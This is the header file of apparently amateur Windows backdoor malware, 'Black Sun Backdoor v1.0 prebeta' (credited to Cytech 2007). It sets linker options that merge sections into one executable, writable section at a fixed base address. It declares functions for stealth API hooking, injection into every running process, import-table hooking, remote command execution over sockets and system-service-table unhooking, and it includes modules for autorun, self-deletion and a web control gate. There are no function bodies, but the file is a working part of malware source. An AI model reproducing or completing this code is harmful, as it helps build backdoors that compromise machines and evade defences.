/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *               Black Sun Backdoor v1.0 prebeta        
 *
 *                    (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [headers.h]
 *     typedefines, libraries, headers, linker options etc...
 *  ---------------------------------------------------------------------
 */
 
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"WinMM.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"imagehlp.lib")

#include <windows.h>
#include <wininet.h>
#include <ntsecapi.h>
#include <tlhelp32.h>
#include <imagehlp.h>
#include <aclapi.h>
#include "ntdll.h"

#pragma optimize("gsy", on) 

#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/ENTRY:WinMain")
#pragma comment(linker, "/BASE:0x29A00000") // baseaddr: do not edit
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text,EWRX")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")



static DWORD WINAPI SetUpStealthHooks(HANDLE hmodCaller);
static DWORD WINAPI StealthMain(LPVOID lpParam);
static BOOL StartProcInject(DWORD dwPid, LPTSTR p_Name);
static DWORD WINAPI ClientSend(char *Data, SOCKET zsock);
static HANDLE WINAPI StartThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID param);
static DWORD WINAPI ReplaceIAT(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew, HMODULE hCModule);
static DWORD WINAPI ReplaceIATEntryInAllMods(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew);
static DWORD WINAPI ExecuteCMD(char *command);
static DWORD GetPIDbyName(LPTSTR p_Name);
static DWORD ProcessInject(HANDLE p_handle, DWORD (WINAPI f_Main)(LPVOID));
static DWORD StartProcInject(DWORD dwPid, LPTSTR p_Name, DWORD (WINAPI f_Main)(LPVOID));
static DWORD WINAPI InjectAllProcesses(DWORD (WINAPI f_Main)(LPVOID));
BOOL ReadSST(PDWORD);

typedef BOOL(WINAPI* INETCHECKPROC) // internet.h -> CheckInternetConnection()
(
	LPDWORD lpdwFlags,
	DWORD dwReserved
);

	#pragma comment(lib,"ntdll.lib")

	#include	"conf.h"		// configurations
  	#include	"strings.h"		// my functions
	#include	"internet.h"	// internet functions
	#include	"functions.h"	// autorun, selfdelete, execute
	#include	"backdoor.h"	// backdoor functions
	#include	"webgate.h"		// work with WEB gate
	#include	"iathooking.h" 	// import adress table hooking
	#include	"inject.h"		// process-injection 
	
	#include 	"r0.h"			// sst-unhook #1
	#include 	"sst.h"			// sst-unhook #2
